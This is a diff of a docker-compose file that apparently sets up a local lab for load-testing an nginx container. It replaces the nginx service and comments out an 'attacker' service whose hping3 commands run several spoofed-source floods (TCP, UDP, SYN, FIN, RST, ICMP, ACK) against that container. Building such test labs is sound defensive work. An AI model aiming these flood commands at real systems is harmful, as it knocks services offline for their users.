@@ -1,22 +1,26 @@
 version: '3.6'
 services:
-
-  nginx:
-    image: nginx:alpine
-    container_name: nginx
-    restart: unless-stopped
+  ubuntu-nginx:
+    container_name: ubuntu-nginx
+    image: ubuntu/nginx
+    restart: always
     ports:
-      - "443:443"
       - "8080:80"
     volumes:
-      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
+      - ./nginx/nginx.conf:/etc/nginx/nginx.conf
+      - ./www:/var/www/html
+      - ./log:/var/log/nginx
 
-  attacker:
-    image: utkudarilmaz/hping3:latest
-    container_name: attacker
-    command: "--rand-source --flood nginx -p 8080"
-#    command: "--rand-source --udp --flood nginx -p 8080"
-#    command: "--rand-source -S --flood nginx -p 8080"
-#    command: "--rand-source -F --flood nginx -p 8080"
-#    command: "--rand-source -icmp --flood nginx -p 8080"
-    restart: always
+#  attacker:
+#    image: utkudarilmaz/hping3:latest
+#    container_name: attacker
+#    depends_on:
+#      - ubuntu-nginx
+#    command: "--rand-source --flood ubuntu-nginx -p 8080"
+#    #    command: "--rand-source -S -q -n --flood ubuntu-nginx -p 8080"
+#    #    command: "--rand-source --udp --flood ubuntu-nginx -p 8080"
+#    #    command: "--rand-source -F --flood ubuntu-nginx -p 8080"
+#    #    command: "--rand-source -R --flood ubuntu-nginx -p 8080"
+#    #    command: "--rand-source -PA --flood ubuntu-nginx -p 8080"
+#    #    command: "--rand-source -1 --flood ubuntu-nginx -p 8080"
+#    restart: always
